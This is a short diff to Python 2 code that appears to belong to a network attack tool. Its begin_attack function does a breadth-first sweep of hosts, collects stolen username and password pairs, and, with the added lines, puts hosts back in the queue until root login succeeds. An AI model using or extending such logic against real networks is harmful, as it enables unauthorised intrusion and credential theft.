@@ -108,7 +108,7 @@ def get_host_port(data):
 
 def begin_attack(client):
     global initial_comps, FORWARD_PORT
-    print "\n\nBeginning attack...\n"
+    print "\nBeginning attack...\n"
 
     # executes BFS over network
     while not q.empty():
@@ -187,6 +187,10 @@ def begin_attack(client):
                 for cred in user_passes:
                     # add the creds to the dict of accounts
                     server.accounts[cred[0]] = cred[1]
+
+            # put back in queue if never logged in as root
+            else:
+                q.put(server)
 
         # otherwise, we could not login and need to keep searching for creds
         else:
